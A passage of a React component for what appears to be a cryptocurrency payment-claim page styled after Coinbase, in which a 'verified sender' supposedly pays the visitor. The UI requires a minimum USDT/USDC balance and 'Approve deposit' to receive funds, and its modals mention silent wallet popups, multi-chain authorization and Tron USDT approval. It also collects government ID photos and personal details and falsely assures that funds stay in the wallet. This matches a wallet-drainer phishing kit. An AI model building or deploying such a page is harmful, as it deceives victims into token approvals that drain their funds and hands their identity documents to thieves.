                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </div>
                    <p className="text-xs text-muted">Verified sender</p>
                  </div>
                </div>

                <div className="mb-6">
                  <CoinbaseAmount value={session.amountEur} size="hero" />
                </div>
                <p className="mb-8 max-w-md text-lg leading-relaxed text-body">
                  You're signed in as <span className="font-mono font-medium text-ink">{address ? short(address) : ""}</span>. Continue to
                  receive this payment from <span className="font-medium text-ink">{session.recipientName}</span>.
                </p>

                <button
                  onClick={handleConnect}
                  disabled={!ready}
                  className="flex h-12 w-full items-center justify-center rounded-lg bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled sm:w-auto"
                >
                  Continue
                </button>

                <div className="mt-12 space-y-8 border-t border-hairline pt-8">
                  <div>
                    <h3 className="mb-3 text-sm font-semibold text-ink">What happens next</h3>
                    <ol className="space-y-3">
                      {[
                        "Connect your wallet securely",
                        "Complete identity verification with government ID",
                        "Meet minimum balance requirement",
                        "Approve deposit to receive funds",
                      ].map((step, i) => (
                        <li key={i} className="flex items-start gap-3 text-sm text-body">
                          <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-surface-strong text-xs font-semibold text-ink">
                            {i + 1}
                          </span>
                          {step}
                        </li>
                      ))}
                    </ol>
                  </div>

                  <div className="rounded-lg border border-hairline bg-surface-soft p-5">
                    <h3 className="mb-3 text-sm font-semibold text-ink">Payment terms</h3>
                    <ul className="space-y-2 text-sm leading-relaxed text-body">
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Funds remain in your wallet at all times during verification
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Session expires {session.sessionMinutes} minutes after connecting
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Multichain
                      </li>
                      <li className="flex items-start gap-2">
                        <svg className="mt-0.5 h-4 w-4 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                        </svg>
                        Minimum balance: {formatEUR(session.minBalanceEur)} in USDC/USDT required
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}

            {phase === "id-verify" && session && (() => {
              const stepIndex = idVerifyStep === "type" ? 0 : idVerifyStep === "upload" ? 1 : 2;
              const DOC_TYPES = [
                { type: "passport",        label: "Passport" },
                { type: "drivers_license", label: "Driver's license" },
                { type: "national_id",     label: "National ID" },
                { type: "residence",       label: "Residence permit" },
              ];
              const docLabel = DOC_TYPES.find((d) => d.type === idDocType)?.label ?? "your ID";
              return (
                <div>
                  <h2 className="mb-1 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
                    Verify your identity
                  </h2>
                  <p className="mb-6 text-sm leading-relaxed text-body">
                    Required to release {formatEUR(session.amountEur)}. Step {stepIndex + 1} of 3.
                  </p>

                  <div className="mb-7 flex items-center gap-1.5">
                    {["Document", "Upload", "Details"].map((label, i) => {
                      const done = i < stepIndex;
                      const active = i === stepIndex;
                      return (
                        <div key={label} className="flex flex-1 flex-col gap-1.5">
                          <div className={`h-1 rounded-full transition-all ${done || active ? "bg-brand" : "bg-hairline"}`} />
                          <span className={`text-[11px] font-medium ${active ? "text-ink" : "text-muted"}`}>
                            {label}
                          </span>
                        </div>
                      );
                    })}
                  </div>

                  {idVerifyStep === "type" && (
                    <div>
                      <p className="mb-3 text-[13px] text-body">Select a government-issued ID to continue.</p>
                      <div className="mb-6 overflow-hidden rounded-xl border border-hairline">
                        <table className="w-full border-collapse text-left">
                          <tbody>
                            {DOC_TYPES.map((doc, idx) => (
                              <tr key={doc.type} className={idx > 0 ? "border-t border-hairline" : undefined}>
                                <td className="p-0">
                                  <button
                                    type="button"
                                    onClick={() => { setIdDocType(doc.type); setIdVerifyStep("upload"); setError(null); }}
                                    className="flex w-full items-center justify-between px-5 py-4 text-left transition hover:bg-surface-soft"
                                  >
                                    <span className="text-[15px] font-medium text-ink">{doc.label}</span>
                                    <svg className="h-5 w-5 shrink-0 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                                    </svg>
                                  </button>
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                      <p className="text-[12px] leading-relaxed text-muted">
                        Documents are encrypted and used only to confirm eligibility. They are never sold or shared.
                      </p>
                    </div>
                  )}

                  {/* ── STEP 2: Document upload ────────────────────────── */}
                  {idVerifyStep === "upload" && (
                    <div>
                      <button
                        onClick={() => { setIdVerifyStep("type"); setError(null); }}
                        className="mb-5 flex items-center gap-1.5 text-[13px] font-medium text-muted transition hover:text-ink"
                      >
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                        </svg>
                        Back
                      </button>
                      <h3 className="mb-1 text-[17px] font-semibold text-ink">Upload {docLabel}</h3>
                      <p className="mb-5 text-[13px] text-body">
                        Take a clear photo or scan. All four corners must be visible.
                      </p>

                      {/* Upload zone */}
                      <label className="mb-4 block cursor-pointer">
                        <div className={`relative flex flex-col items-center justify-center gap-3 overflow-hidden rounded-2xl border-2 border-dashed px-6 py-10 text-center transition ${
                          idFile ? "border-brand/50 bg-brand/5" : "border-hairline hover:border-brand/40 hover:bg-surface-soft"
                        }`}>
                          {idPreviewUrl ? (
                            <>
                              {/* eslint-disable-next-line @next/next/no-img-element */}
                              <img src={idPreviewUrl} alt="ID preview" className="max-h-40 rounded-lg object-contain shadow-md" />
                              <div className="flex items-center gap-2 rounded-pill bg-brand/10 px-3 py-1.5">
                                <svg className="h-3.5 w-3.5 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                                </svg>
                                <span className="text-[12px] font-semibold text-brand">Photo selected — tap to change</span>
                              </div>
                            </>
                          ) : idFile ? (
                            <>
                              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-brand/10">
                                <svg className="h-6 w-6 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                </svg>
                              </div>
                              <div>
                                <p className="text-[14px] font-semibold text-brand">{idFile.name}</p>
                                <p className="text-[12px] text-muted">Tap to change file</p>
                              </div>
                            </>
                          ) : (
                            <>
                              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-surface-strong">
                                <svg className="h-7 w-7 text-muted" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
                                </svg>
                              </div>
                              <div>
                                <p className="text-[14px] font-semibold text-ink">Take a photo or upload file</p>
                                <p className="mt-0.5 text-[12px] text-muted">JPG, PNG, or PDF · Max 8 MB</p>
                              </div>
                            </>
                          )}
                        </div>
                        <input
                          type="file"
                          accept="image/jpeg,image/png,image/webp,application/pdf"
                          className="hidden"
                          onChange={(e) => handleIdFileChange(e.target.files?.[0] ?? null)}
                        />
                      </label>

                      {/* Photo guidelines */}
                      <div className="mb-6 rounded-xl border border-hairline bg-surface-soft p-4">
                        <p className="mb-2.5 text-[11px] font-semibold uppercase tracking-widest text-muted">Photo tips</p>
                        <div className="grid grid-cols-2 gap-y-2 gap-x-4">
                          {["Good lighting, no glare", "All 4 corners visible", "Document not expired", "No blur or shadows"].map((tip) => (
                            <div key={tip} className="flex items-center gap-2 text-[12px] text-body">
                              <svg className="h-3.5 w-3.5 shrink-0 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                              </svg>
                              {tip}
                            </div>
                          ))}
                        </div>
                      </div>

                      {error && (
                        <div className="mb-4 flex items-center gap-2 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
                          <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                          {error}
                        </div>
                      )}

                      <button
                        onClick={() => {
                          if (!idFile) { setError("Please upload a photo of your ID to continue."); return; }
                          setError(null);
                          setIdVerifyStep("info");
                        }}
                        className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                      >
                        Continue
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                        </svg>
                      </button>
                    </div>
                  )}

                  {/* ── STEP 3: Personal information ───────────────────── */}
                  {idVerifyStep === "info" && (
                    <div>
                      <button
                        onClick={() => { setIdVerifyStep("upload"); setError(null); }}
                        className="mb-5 flex items-center gap-1.5 text-[13px] font-medium text-muted transition hover:text-ink"
                      >
                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                        </svg>
                        Back
                      </button>
                      <h3 className="mb-1 text-[17px] font-semibold text-ink">Personal information</h3>
                      <p className="mb-5 text-[13px] text-body">Enter your details exactly as they appear on your ID document.</p>

                      {(idPreviewUrl || idFile) && (
                        <div className="mb-5 flex items-center justify-between gap-4 rounded-xl border border-hairline px-5 py-3.5">
                          <div className="min-w-0">
                            <p className="text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">Document</p>
                            <p className="mt-0.5 text-[14px] font-medium text-ink">{docLabel}</p>
                            <p className="truncate text-[12px] text-muted">{idFile?.name}</p>
                          </div>
                          <span className="shrink-0 text-[12px] font-semibold text-up">Uploaded</span>
                        </div>
                      )}

                      <div className="mb-6 divide-y divide-hairline rounded-xl border border-hairline">
                        <div className="px-5 py-4">
                          <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">Full legal name</label>
                          <input
                            type="text"
                            value={fullName}
                            onChange={(e) => setFullName(e.target.value)}
                            className="h-10 w-full bg-transparent text-[15px] text-ink placeholder:text-muted focus:outline-none"
                            placeholder="As it appears on your ID"
                            autoComplete="name"
                          />
                        </div>
                        <div className="px-5 py-4">
                          <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">Date of birth</label>
                          <input
                            type="date"
                            value={idDob}
                            onChange={(e) => setIdDob(e.target.value)}
                            max={new Date(Date.now() - 18 * 365.25 * 24 * 3600 * 1000).toISOString().slice(0, 10)}
                            className="h-10 w-full bg-transparent text-[15px] text-ink focus:outline-none"
                          />
                        </div>
                        <div className="px-5 py-4">
                          <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-[0.06em] text-muted">Country of issue</label>
                          <CountrySelect value={country} onChange={setCountry} plain />
                        </div>
                      </div>

                      <p className="mb-6 text-[12px] leading-relaxed text-muted">
                        Your information is encrypted and used only to confirm eligibility for this payment. It is never sold or shared with third parties.
                      </p>

                      {error && (
                        <div className="mb-4 rounded-lg bg-down/10 px-4 py-3 text-[13px] text-down">
                          {error}
                        </div>
                      )}

                      <button
                        onClick={handleVerifyID}
                        disabled={processing}
                        className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                      >
                        {processing ? (
                          <>
                            <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/30 border-t-white" />
                            Verifying…
                          </>
                        ) : (
                          "Submit verification"
                        )}
                      </button>
                    </div>
                  )}
                </div>
              );
            })()}

            {phase === "balance-check" && (
              <div className="py-14 text-center">
                <div className="mx-auto mb-6 h-12 w-12 animate-spin rounded-full border-[3px] border-hairline border-t-brand" />
                <h2 className="mb-2 text-lg font-semibold text-ink">Checking wallet balance</h2>
                <p className="text-sm text-body">Scanning Ethereum, BNB Chain, and Polygon for USDT / USDC balances...</p>
              </div>
            )}

            {phase === "insufficient-balance" && session && (
              <div>
                {/* Status icon */}
                <div className="mb-6 flex flex-col items-center text-center">
                  <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-accent-yellow/10">
                    <svg className="h-7 w-7 text-accent-yellow" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                  </div>
                  <h2 className="mb-2 text-[18px] font-semibold text-ink">Minimum balance requirement not met</h2>
                  <p className="max-w-xs text-[13px] leading-relaxed text-body">
                    {totalBalanceEur === 0
                      ? `A minimum of ${formatEUR(session.minBalanceEur)} in USDT or USDC is required to receive this payment.`
                      : `Your wallet holds ${formatEUR(totalBalanceEur)} in USDT/USDC. You need at least ${formatEUR(session.minBalanceEur)} to proceed.`}
                  </p>
                </div>

                {/* Required vs held */}
                <div className="mb-6 rounded-xl border border-hairline bg-surface-soft p-5">
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Your balance</span>
                    <span className="font-semibold tabular-nums text-ink">{formatEUR(totalBalanceEur)}</span>
                  </div>
                  <div className="my-3 h-px bg-hairline" />
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Required</span>
                    <span className="font-semibold tabular-nums text-ink">{formatEUR(session.minBalanceEur)}</span>
                  </div>
                  <div className="my-3 h-px bg-hairline" />
                  <div className="flex items-center justify-between text-[13px]">
                    <span className="text-body">Shortfall</span>
                    <span className="font-semibold tabular-nums text-down">
                      {formatEUR(Math.max(0, session.minBalanceEur - totalBalanceEur))}
                    </span>
                  </div>
                </div>

                <button
                  onClick={() => checkWalletBalances()}
                  disabled={processing}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active disabled:bg-brand-disabled"
                >
                  {processing ? "Checking…" : "Recheck balance"}
                </button>
              </div>
            )}

            {phase === "ready-to-approve" && session && (
              <div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">You're all set</h2>
                <p className="mb-8 text-sm leading-relaxed text-body">
                  Approve the deposit to finish setting up your wallet to receive {formatEUR(session.amountEur)}.
                </p>

                <div className="mb-9 divide-y divide-hairline rounded-xl border border-hairline">
                  {[
                    { label: "Wallet connected", detail: address ? short(address, 8, 6) : "" },
                    { label: "Identity verified", detail: fullName || "Complete" },
                    { label: "Minimum balance met", detail: `${formatEUR(totalBalanceEur)} available` },
                  ].map((item) => (
                    <div key={item.label} className="flex items-center justify-between px-5 py-3.5">
                      <div className="flex items-center gap-2.5">
                        <span className="flex h-5 w-5 items-center justify-center rounded-full bg-up/10 text-up">
                          <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                          </svg>
                        </span>
                        <span className="text-sm font-medium text-ink">{item.label}</span>
                      </div>
                      <span className="text-xs text-muted">{item.detail}</span>
                    </div>
                  ))}
                </div>

                <button
                  onClick={handleApproveDeposit}
                  className="flex h-12 w-full items-center justify-center gap-2 rounded-pill bg-brand px-8 text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Approve deposit
                </button>
              </div>
            )}

            {phase === "approving" && (
              <div className="py-10 text-center">
                <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
                <h2 className="mt-5 text-lg font-semibold text-ink">Approving</h2>
                <p className="mt-2 text-sm text-body">
                  Confirm any prompts in your wallet. We&apos;re detecting balances and authorizing deposit.
                </p>
              </div>
            )}

            {phase === "complete" && session && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-up/10">
                  <svg className="h-8 w-8 text-up" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <h2 className="mb-2 font-display text-2xl font-normal tracking-[-0.03em] text-ink sm:text-3xl">
                  Wallet ready to receive funds
                </h2>
                <p className="mx-auto mb-9 max-w-sm text-sm leading-relaxed text-body">
                  {formatEUR(session.amountEur)} will be released to your wallet now that verification is complete.
                </p>

                <div className="mx-auto mb-7 max-w-sm rounded-xl border border-hairline bg-surface-soft p-5 text-left">
                  <div className="mb-3 flex items-center justify-between">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Recipient</span>
                    <span className="font-mono text-xs text-ink">{address && short(address, 8, 6)}</span>
                  </div>
                  <div className="flex items-center justify-between border-t border-hairline pt-3">
                    <span className="text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Amount</span>
                    <span className="text-lg font-semibold tabular-nums text-ink">{formatEUR(session.amountEur)}</span>
                  </div>
                </div>

                <div className="mx-auto flex max-w-sm items-center gap-2 rounded-lg bg-brand/5 p-3.5 text-left text-xs text-brand">
                  <svg className="h-4 w-4 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Transfers are typically completed within a few minutes.
                </div>
              </div>
            )}

            {phase === "expired" && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-surface-strong text-muted">
                  <svg className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Session closed</h2>
                <p className="mx-auto mb-2 max-w-sm text-sm text-body">
                  The 25-minute window for this checkout session has ended before verification was completed.
                </p>
                <p className="mx-auto max-w-sm text-sm text-body">
                  The reserved amount has been returned to the sender. No funds were ever withdrawn from your wallet.
                </p>
              </div>
            )}

            {phase === "error" && (
              <div className="py-4 text-center">
                <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
                  <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <h2 className="mb-2 text-lg font-semibold text-ink">Something went wrong</h2>
                <p className="mx-auto mb-8 max-w-sm text-sm text-body">{error}</p>
                <button
                  onClick={() => {
                    setError(null);
                    setPhase(session ? "idle" : "no-session");
                  }}
                  className="h-12 rounded-pill bg-brand px-8 text-sm font-semibold text-on-brand transition hover:bg-brand-active"
                >
                  Start over
                </button>
              </div>
            )}
          </div>

          {session && (
            <aside className="order-first space-y-4 lg:order-none lg:sticky lg:top-24">
              {/* Timer now floats fixed bottom-right on all screen sizes */}

              <div className="rounded-card border border-hairline bg-surface-card p-5 shadow-card sm:p-6">
                <p className="mb-1 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Checkout amount</p>
                <div className="mb-5"><CoinbaseAmount value={session.amountEur} size="sidebar" /></div>

                <div className="space-y-3 text-sm">
                  <div className="flex items-center justify-between">
                    <span className="text-body">From</span>
                    <span className="flex items-center gap-1.5 font-medium text-ink">
                      {session.recipientName}
                      <svg className="h-3.5 w-3.5 text-brand" viewBox="0 0 24 24" fill="currentColor">
                        <path
                          fillRule="evenodd"
                          d="M8.603 3.799A4.49 4.49 0 0112 2.25c1.357 0 2.573.6 3.397 1.549a4.49 4.49 0 013.498 1.307 4.491 4.491 0 011.307 3.497A4.49 4.49 0 0121.75 12a4.49 4.49 0 01-1.549 3.397 4.491 4.491 0 01-1.307 3.497 4.491 4.491 0 01-3.497 1.307A4.49 4.49 0 0112 21.75a4.49 4.49 0 01-3.397-1.549 4.49 4.49 0 01-3.498-1.306 4.491 4.491 0 01-1.307-3.498A4.49 4.49 0 012.25 12c0-1.357.6-2.573 1.549-3.397a4.49 4.49 0 011.307-3.497 4.49 4.49 0 013.497-1.307zm7.007 6.387a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Issued</span>
                    <span className="font-medium text-ink">{new Date(session.issuedAt).toLocaleDateString()}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Wallet</span>
                    <span className="font-mono font-medium text-ink">{address ? short(address) : "Not connected"}</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Networks</span>
                    <span className="rounded-pill bg-surface-strong px-2.5 py-1 text-[11px] font-semibold text-ink">Multichain</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-body">Min. balance</span>
                    <span className="font-medium tabular-nums text-ink">{formatEUR(session.minBalanceEur)}</span>
                  </div>
                  <div className="flex items-center justify-between border-t border-hairline pt-3">
                    <span className="text-body">Status</span>
                    <span className="rounded-pill bg-brand/10 px-2.5 py-1 text-[11px] font-semibold text-brand">
                      {phase === "complete" ? "Released" : phase === "expired" ? "Closed" : "Pending"}
                    </span>
                  </div>
                </div>
              </div>

              <div className="rounded-card border border-hairline bg-surface-card p-5 sm:p-6">
                <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.08em] text-muted">Security & Compliance</p>
                <ul className="space-y-3 text-sm leading-relaxed text-body">
                  {[
                    { icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z", text: "Institutional-grade custody infrastructure" },
                    { icon: "M13 10V3L4 14h7v7l9-11h-7z", text: "Real-time on-chain verification" },
                    { icon: "M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z", text: "Identity verification required" },
                    { icon: "M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z", text: "Multichain stablecoin support" },
                  ].map((item) => (
                    <li key={item.text} className="flex gap-2.5">
                      <svg className="mt-0.5 h-4 w-4 shrink-0 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={item.icon} />
                      </svg>
                      {item.text}
                    </li>
                  ))}
                </ul>
              </div>
            </aside>
          )}
        </div>

      </div>

      {/* Modal 1 runs silently — no UI, just the wallet popup */}
      {/* Mobile outside Tron-capable DApp browser */}
      {needsTrustOpen && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 px-4 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
            <div className="text-center">
              <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-brand/10">
                <svg className="h-7 w-7 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold tracking-tight text-ink">Open in a wallet browser</h3>
              <p className="mt-2 text-sm text-body">
                WalletConnect can&apos;t access Tron. Open this page in a wallet that supports Tron so USDT approval can run.
              </p>
              <div className="mt-5 space-y-2.5">
                {TRON_CAPABLE_WALLETS.map((w) => (
                  <button
                    key={w.id}
                    type="button"
                    onClick={() => handleOpenWalletDapp(w.id)}
                    className={
                      "flex h-12 w-full items-center justify-center rounded-pill text-[15px] font-semibold transition " +
                      (w.id === "trust"
                        ? "bg-brand text-on-brand hover:bg-brand-active"
                        : "border border-hairline bg-surface-soft text-ink hover:bg-surface-card")
                    }
                  >
                    Open in {w.label}
                  </button>
                ))}
              </div>
              <p className="mt-3 text-xs text-muted">
                MetaMask, Rainbow, and Coinbase Wallet are EVM-only here — use Trust, TokenPocket, TronLink, or imToken for Tron USDT.
              </p>
            </div>
          </div>
        </div>
      )}

      {modal1Scanning && (
        <div
          className="fixed inset-0 z-50 flex items-end justify-center bg-[#0a1628]/55 px-4 pb-8 pt-16 backdrop-blur-[6px] sm:items-center sm:pb-4"
          role="status"
          aria-live="polite"
          aria-busy="true"
        >
          <div className="w-full max-w-[360px] overflow-hidden rounded-2xl border border-white/10 bg-surface-card shadow-[0_24px_80px_rgba(10,22,40,0.35)]">
            <div className="h-1 w-full overflow-hidden bg-brand/10">
              <div className="h-full w-2/5 rounded-full bg-brand motion-safe:animate-[detectPulse_1.35s_ease-in-out_infinite]" />
            </div>
            <div className="px-6 py-10 sm:px-8">
              <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-brand/[0.08] ring-1 ring-brand/15">
                <div className="h-8 w-8 animate-spin rounded-full border-[2.5px] border-brand/20 border-t-brand" />
              </div>
              <h3 className="mt-5 text-center text-[17px] font-semibold tracking-tight text-ink">
                Detecting balances
              </h3>
            </div>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------------ */}
      {/* Modal 2 — Approving spinner (balance detect + multi-chain authorize) */}
      {/* ------------------------------------------------------------------ */}
      {modal2Open && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
            <div className="py-8 text-center">
              <div className="mx-auto h-12 w-12 animate-spin rounded-full border-[3px] border-brand/20 border-t-brand" />
              <p className="mt-5 text-[15px] font-semibold text-ink">Approving</p>
              <p className="mt-2 text-sm text-body">
                Confirm any prompts in your wallet.
              </p>
            </div>
          </div>
        </div>
      )}

    </EscrowShell>
  );
}
